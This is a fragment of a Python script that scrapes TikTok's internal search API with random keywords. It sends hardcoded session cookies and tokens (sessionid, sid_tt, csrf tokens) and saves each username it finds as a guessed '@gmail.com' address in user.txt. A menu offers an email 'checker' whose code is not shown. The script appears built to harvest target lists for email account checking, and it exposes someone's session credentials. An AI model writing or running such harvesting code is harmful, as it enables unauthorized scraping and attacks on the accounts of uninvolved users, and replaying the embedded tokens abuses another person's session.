        except IndexError as error:
            p+=1
            
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f'[=] - Done : {a}\n[=] - Bad : {p}\n')

def fol1():
    global a,p
    lm = 'zaidkaream_'
    while True:
        us11 = str(''.join(random.choice(lm)for o in range(3))).lower()
        #us11=''
        
            
        url2 =f'https://www.tiktok.com/api/search/general/full/?aid=1988&app_language=en&app_name=tiktok_web&battery_info=0.55&browser_language=en-US&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F107.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_id=7160541228835522053&device_platform=web_pc&focus_state=true&from_page=search&history_len=8&is_fullscreen=false&is_page_visible=true&keyword={us11}&offset=0&os=windows&priority_region=IQ&referer=https%3A%2F%2Fwww.tiktok.com%2Flogin&region=IQ&root_referer=https%3A%2F%2Fwww.google.com%2F&screen_height=900&screen_width=1600&tz_name=Asia%2FBaghdad&webcast_language=en&msToken=N0jkY7svBP65RbcYUyg-I2QIQSevyvJQ5H4JZnNvJCmszP03Rk9pK8liQB8b-okpAsiIHkMbMJ0AEpu0YI0l_sCBSRJ3_LDHlVeG1pO7Ho3bYH_Xd5tNbWbS-m4ezJAlRIdh7-zgNVzy9bGJ&X-Bogus=DFSzswVLVCtANtdJS00Ngt-w3U57&_signature=_02B4Z6wo00001T0jObgAAIDBEBmsEH4CKfk9Iz0AACwyfb'
        head2 ={
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            #'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'cookie': '_ttp=2GftrOTPvOz42nD9pREjFcTuiGb; x-jupiter-uuid=16671934426736376; __tea_cache_tokens_1988={%22_type_%22:%22default%22%2C%22user_unique_id%22:%227160541228835522053%22%2C%22timestamp%22:1667193449556}; passport_csrf_token=c3a7dcce4cbc87efe16fc2ec46081c77; passport_csrf_token_default=c3a7dcce4cbc87efe16fc2ec46081c77; tta_attr_id=0.1667458291.7161678825598779393; tta_attr_id_mirror=0.1667458291.7161678825598779393; _ga=GA1.1.2078512563.1667458301; _ga_HV1FL86553=GS1.1.1667458301.1.0.1667458306.55.0.0; tiktok_webapp_theme=dark; cmpl_token=AgQQAPOgF-RO0rHDH6MaM10j-T7DfJfY_4csYMuEDQ; sid_guard=9cb383920f3570251792e184502c6c92%7C1667680860%7C5184000%7CWed%2C+04-Jan-2023+20%3A41%3A00+GMT; uid_tt=b2034bcf4046b49c96631bb998ef51bc3df0a8d0377e2c5731fc8daa4433dbd6; uid_tt_ss=b2034bcf4046b49c96631bb998ef51bc3df0a8d0377e2c5731fc8daa4433dbd6; sid_tt=9cb383920f3570251792e184502c6c92; sessionid=9cb383920f3570251792e184502c6c92; sessionid_ss=9cb383920f3570251792e184502c6c92; sid_ucp_v1=1.0.0-KDk4NTVkZDQ1N2RhNzNjNzhmNmZmYjE2YTg3MjU1Y2ZlZmMzZjBiMTYKIAiaiIaQyaD8_mEQ3JSbmwYYswsgDDDP7PePBjgEQOoHEAMaBm1hbGl2YSIgOWNiMzgzOTIwZjM1NzAyNTE3OTJlMTg0NTAyYzZjOTI; ssid_ucp_v1=1.0.0-KDk4NTVkZDQ1N2RhNzNjNzhmNmZmYjE2YTg3MjU1Y2ZlZmMzZjBiMTYKIAiaiIaQyaD8_mEQ3JSbmwYYswsgDDDP7PePBjgEQOoHEAMaBm1hbGl2YSIgOWNiMzgzOTIwZjM1NzAyNTE3OTJlMTg0NTAyYzZjOTI; store-idc=useast2a; store-country-code=id; store-country-code-src=uid; tt-target-idc=alisg; tt-target-idc-sign=b7ipJSZpyMlRHSUyTsxqIW_lUsPJJ8302AJMe2EzMmWMxA-E-UgF15LHgj5FquFZgD1ZIj_6OEK9bryi3b_4ma14pQXnt2EEFz-5SnV_X8xY-8w100bmu_zCYDO6TNBinv3wzjcMPkutOGfJVAB2OSNk0va2AQuD3KHj-UUt0LqmtpQ2Lq-jafs-Cn5UxPNuBYH1QOrHRVAStVvupfixkuHI58kCalS-AtxCx3klp5AaznFaaj8aLHhvoZfv2F_YDs2XozZU-t2sVfeZrEQEREdXb-6at1jtYFs5x6twVjLwrmwCNcBlQ3VFVIh7OCG6gxz2cBeWc81U6ExsgzD1nn5DyTEYqKX_kA-IIUR8PSl-dlNHzuzx-z6K_vFJ5r1flLJa3RtIF81YiI8-lVhoQ9nFublVxm6J3DpzQzOK35MtbklFswPE6O8pKEhDszMgqCDAdgjgEqr7F-wDYdEW62rVyNb5FUyxu05nW9f_Iv7WnKeD396Er5VgFQDCqQSH; tt_csrf_token=6KXFYwlT-__ZZjvvziN-sC0dUCO8DGu52TD4; _abck=3C6F7216904663C60C96E5708586C000~-1~YAAQHNhraMIKTTuEAQAAglLlTAjDRcF1VTpGF7kn1222hvYcyKW7HEZwCNCAWyxhIIa4HkGB+jcCKeyocVaTdtXuyTEB3iV07PXvqmFfUTdUc6XD7uQ/eFljhXYXubXfbjbY2/xkUfOVTzSW93m6veBpLaela3cHWznwxP5006biUkgrOyUatvhojoXlHsBHMcr6vO5pYlNamJtxcFa6oujOVUKIpaHn/PR4d1d8Lp+pbOBPRQQe6icpShmToyNCE5guuSsw6s8iznpyVjCcBCjOKg+iKggmjEBqUOmAq8oFuquscCs280sQVjo3IehfJqdN/M8ZSDoI1Lam1p7VwAlcByXde/I3qikJjhsV0A2kRLmZ1jTcDexdL+QXDu6hFQHcz4jNOzJaiw==~-1~-1~-1; bm_sz=44926AC0387859A5B58474D3F8AE5985~YAAQHNhraMMKTTuEAQAAglLlTBFm5sjea4MIdY/8hJ2Wg+7N/n5iyTpcJ8cJLN19/vLH06Wakzua3RXEPJ5BH8hCjzmoZDrOhwcVsZrW1EhkUT+B/HBjsze8/arOnVuo1RVscNptcPnCzfgfwsGSbe/dj4RQNdcVYCfWHv/DBb3z7+L0CX48ay6KIx9y0oDTMYE2r4vdXmEwV5OMe3HbARwAp+uujOHeTndo2XrmFh7ZSSKskVAlchdp36yREaO7WSxAnkfaBN4edb2W4SBy1K7G0BeI0AEOBvPBU5IRmyFnzXQ=~4534835~3490882; passport_fe_beating_status=true; ttwid=1%7CDhGaolWaz087AfPx33t_h6T6dfNHRKseYR6CrXox-jI%7C1667737428%7C8c0546248bab942681971e12af96011f426869c80ab05b5097bbbd0fbb9e0b0c; odin_tt=339df1b825068c0a6117fd3c42f22f9fc5f2c42a843f9dda904ef03e3ebcc14881da7fd88693a2c2dae0f06b62f8964a8b0efe6faa6cea9b3f74fb067fcce24828dd6eac7f33026b0434b23ec2406f6d; msToken=c2iD4f0w5K2JG5Sp5inDGGJCSqwrUfQEgkFMsDJro3mdyfMDsBRkQF9k5RGBUErzFwvg2_8bQIS8z4ffH7eQOdN6CRIHcIMXuc0lhSUQ4l8tqMXiCsHVdxGNNaw_GA5ea35Tc2Tq6VeNqhYq; msToken=fMvARoZwHtr4fupFRvfE-h1xmljW6j5DZTfUUD_WgW21j_-ZNZNnKchftJRILcZ64Yv1cl5aTp0Mwifn8sMSOvyT7Yv-rKx7iPK9if_TppQe2dV-cYPU9v7VR-2CQd4iIZys1c6Q9s3pqWn5',
            'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
        }
        try:
            re2 = requests.get(url2,headers=head2).json()
        except requests.exceptions.ConnectionError as error :
            continue
        
        try:
            try:
            
                us1 = (len(re2['data'][0]['user_list'][0]['user_info']))
            
                
                for i in range(0,11):
                
                    us = re2['data'][0]['user_list'][i]['user_info']['unique_id']

                    a+=1
                    os.system('cls' if os.name=='nt'else'clear')
                    print(f'[-] - Done : {a}\n[-] - Bad : {p}\n[-] - User : {us}\n')
                    with open('user.txt','a') as f8:
                        f8.write(f'{us}@gmail.com\n')
            except IndexError as error:
                p+=1
                os.system('cls' if os.name=='nt'else'clear')
                print(f'[-] - Done : {a}\n[-] - Bad : {p}\n[-] - User : {us}\n')
                continue
        except KeyError as error:
            p+=1
            continue
                    
        
              
def ok():
    global a,p
    us122= 'qwertyuiolkjhgfdsaxzzvbnm_'
    us12 = str(''.join(random.choice(us122)for o in range(3))).lower()
    while True:
        url4 = f'https://www.tiktok.com/api/search/general/full/?aid=1988&app_language=en&app_name=tiktok_web&battery_info=0.38&browser_language=en-US&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F107.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_id=7160541228835522053&device_platform=web_pc&focus_state=true&from_page=search&history_len=11&is_fullscreen=false&is_page_visible=true&keyword={us12}&offset=0&os=windows&priority_region=IQ&referer=https%3A%2F%2Fwww.tiktok.com%2Fsearch%2Fuser%3Flang%3Den%26q%3Dwdwd%26t%3D1667737468463&region=IQ&root_referer=https%3A%2F%2Fwww.google.com%2F&screen_height=900&screen_width=1600&tz_name=Asia%2FBaghdad&webcast_language=en&msToken=sEJbKN3GIVrxYXriu9UX0c4koEKjhps0nI3QUsIg5SPl-JLGSWeAiMyeivlBY4c1Vw-4VUBrITAaklNnmEBH7TV4JND2QBDbRegFvFAHYuuikaTC__tBEqWUfPU_Gg13IiteK14CaDlOmW5B&X-Bogus=DFSzswVLts2ANtdJS00OeU-w3URP&_signature=_02B4Z6wo00001UqO7xQAAIDBZ7R6vDYtBjlKjuuAADHHab'
        head3 ={
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                #'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'cookie': '_ttp=2GftrOTPvOz42nD9pREjFcTuiGb; x-jupiter-uuid=16671934426736376; __tea_cache_tokens_1988={%22_type_%22:%22default%22%2C%22user_unique_id%22:%227160541228835522053%22%2C%22timestamp%22:1667193449556}; passport_csrf_token=c3a7dcce4cbc87efe16fc2ec46081c77; passport_csrf_token_default=c3a7dcce4cbc87efe16fc2ec46081c77; tta_attr_id=0.1667458291.7161678825598779393; tta_attr_id_mirror=0.1667458291.7161678825598779393; _ga=GA1.1.2078512563.1667458301; _ga_HV1FL86553=GS1.1.1667458301.1.0.1667458306.55.0.0; tiktok_webapp_theme=dark; cmpl_token=AgQQAPOgF-RO0rHDH6MaM10j-T7DfJfY_4csYMuEDQ; sid_guard=9cb383920f3570251792e184502c6c92%7C1667680860%7C5184000%7CWed%2C+04-Jan-2023+20%3A41%3A00+GMT; uid_tt=b2034bcf4046b49c96631bb998ef51bc3df0a8d0377e2c5731fc8daa4433dbd6; uid_tt_ss=b2034bcf4046b49c96631bb998ef51bc3df0a8d0377e2c5731fc8daa4433dbd6; sid_tt=9cb383920f3570251792e184502c6c92; sessionid=9cb383920f3570251792e184502c6c92; sessionid_ss=9cb383920f3570251792e184502c6c92; sid_ucp_v1=1.0.0-KDk4NTVkZDQ1N2RhNzNjNzhmNmZmYjE2YTg3MjU1Y2ZlZmMzZjBiMTYKIAiaiIaQyaD8_mEQ3JSbmwYYswsgDDDP7PePBjgEQOoHEAMaBm1hbGl2YSIgOWNiMzgzOTIwZjM1NzAyNTE3OTJlMTg0NTAyYzZjOTI; ssid_ucp_v1=1.0.0-KDk4NTVkZDQ1N2RhNzNjNzhmNmZmYjE2YTg3MjU1Y2ZlZmMzZjBiMTYKIAiaiIaQyaD8_mEQ3JSbmwYYswsgDDDP7PePBjgEQOoHEAMaBm1hbGl2YSIgOWNiMzgzOTIwZjM1NzAyNTE3OTJlMTg0NTAyYzZjOTI; store-idc=useast2a; store-country-code=id; store-country-code-src=uid; tt-target-idc=alisg; tt-target-idc-sign=b7ipJSZpyMlRHSUyTsxqIW_lUsPJJ8302AJMe2EzMmWMxA-E-UgF15LHgj5FquFZgD1ZIj_6OEK9bryi3b_4ma14pQXnt2EEFz-5SnV_X8xY-8w100bmu_zCYDO6TNBinv3wzjcMPkutOGfJVAB2OSNk0va2AQuD3KHj-UUt0LqmtpQ2Lq-jafs-Cn5UxPNuBYH1QOrHRVAStVvupfixkuHI58kCalS-AtxCx3klp5AaznFaaj8aLHhvoZfv2F_YDs2XozZU-t2sVfeZrEQEREdXb-6at1jtYFs5x6twVjLwrmwCNcBlQ3VFVIh7OCG6gxz2cBeWc81U6ExsgzD1nn5DyTEYqKX_kA-IIUR8PSl-dlNHzuzx-z6K_vFJ5r1flLJa3RtIF81YiI8-lVhoQ9nFublVxm6J3DpzQzOK35MtbklFswPE6O8pKEhDszMgqCDAdgjgEqr7F-wDYdEW62rVyNb5FUyxu05nW9f_Iv7WnKeD396Er5VgFQDCqQSH; tt_csrf_token=6KXFYwlT-__ZZjvvziN-sC0dUCO8DGu52TD4; _abck=3C6F7216904663C60C96E5708586C000~-1~YAAQHNhraMIKTTuEAQAAglLlTAjDRcF1VTpGF7kn1222hvYcyKW7HEZwCNCAWyxhIIa4HkGB+jcCKeyocVaTdtXuyTEB3iV07PXvqmFfUTdUc6XD7uQ/eFljhXYXubXfbjbY2/xkUfOVTzSW93m6veBpLaela3cHWznwxP5006biUkgrOyUatvhojoXlHsBHMcr6vO5pYlNamJtxcFa6oujOVUKIpaHn/PR4d1d8Lp+pbOBPRQQe6icpShmToyNCE5guuSsw6s8iznpyVjCcBCjOKg+iKggmjEBqUOmAq8oFuquscCs280sQVjo3IehfJqdN/M8ZSDoI1Lam1p7VwAlcByXde/I3qikJjhsV0A2kRLmZ1jTcDexdL+QXDu6hFQHcz4jNOzJaiw==~-1~-1~-1; bm_sz=44926AC0387859A5B58474D3F8AE5985~YAAQHNhraMMKTTuEAQAAglLlTBFm5sjea4MIdY/8hJ2Wg+7N/n5iyTpcJ8cJLN19/vLH06Wakzua3RXEPJ5BH8hCjzmoZDrOhwcVsZrW1EhkUT+B/HBjsze8/arOnVuo1RVscNptcPnCzfgfwsGSbe/dj4RQNdcVYCfWHv/DBb3z7+L0CX48ay6KIx9y0oDTMYE2r4vdXmEwV5OMe3HbARwAp+uujOHeTndo2XrmFh7ZSSKskVAlchdp36yREaO7WSxAnkfaBN4edb2W4SBy1K7G0BeI0AEOBvPBU5IRmyFnzXQ=~4534835~3490882; passport_fe_beating_status=true; ttwid=1%7CDhGaolWaz087AfPx33t_h6T6dfNHRKseYR6CrXox-jI%7C1667737428%7C8c0546248bab942681971e12af96011f426869c80ab05b5097bbbd0fbb9e0b0c; odin_tt=339df1b825068c0a6117fd3c42f22f9fc5f2c42a843f9dda904ef03e3ebcc14881da7fd88693a2c2dae0f06b62f8964a8b0efe6faa6cea9b3f74fb067fcce24828dd6eac7f33026b0434b23ec2406f6d; msToken=c2iD4f0w5K2JG5Sp5inDGGJCSqwrUfQEgkFMsDJro3mdyfMDsBRkQF9k5RGBUErzFwvg2_8bQIS8z4ffH7eQOdN6CRIHcIMXuc0lhSUQ4l8tqMXiCsHVdxGNNaw_GA5ea35Tc2Tq6VeNqhYq; msToken=fMvARoZwHtr4fupFRvfE-h1xmljW6j5DZTfUUD_WgW21j_-ZNZNnKchftJRILcZ64Yv1cl5aTp0Mwifn8sMSOvyT7Yv-rKx7iPK9if_TppQe2dV-cYPU9v7VR-2CQd4iIZys1c6Q9s3pqWn5',
                'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
            }
        re1 = requests.get(url4,headers=head3).json()
        #print(re1)
        try:
            try:
            
                us1 = (len(re1['data'][0]['user_list'][0]['user_info']))
            
                
                for i in range(0,11):
                
                    us = re1['data'][0]['user_list'][i]['user_info']['unique_id']

                    a+=1
                    os.system('cls' if os.name=='nt'else'clear')
                    print(f'[-] - Done : {a}\n[-] - Bad : {p}\n[-] - User : {us}\n')
                    with open('user.txt','a') as f8:
                        f8.write(f'{us}@gmail.com\n')
            except IndexError as error:
                p+=1
                os.system('cls' if os.name=='nt'else'clear')
                print(f'[-] - Done : {a}\n[-] - Bad : {p}\n[-] - User : {us}\n')
                continue
        except KeyError as error:
            p+=1
            continue
    #return False

print('[1] - UserList\n[2] - UserList 2\n[3] - List User 3\n[4] - Cheker Email\n[0] - Remove File\n')
try:
    
    
    inp = int(input('[=] - Enter Your Choice : '))
    if inp == 1:
        fol()
    elif inp ==2:
        fol2()
    elif inp == 3:
        ok()
    elif inp==4:
        gmail()


    elif inp ==0:
        try:
            os.remove('user.txt')
            print('Done Remove File')
            time.sleep(2)
            os.system('clear')
            exit()
            
            
        except FileNotFoundError as error :
            print('File No')
            time.sleep(2)
            exit()
except ValueError as error:
    print('Number Your Choice')
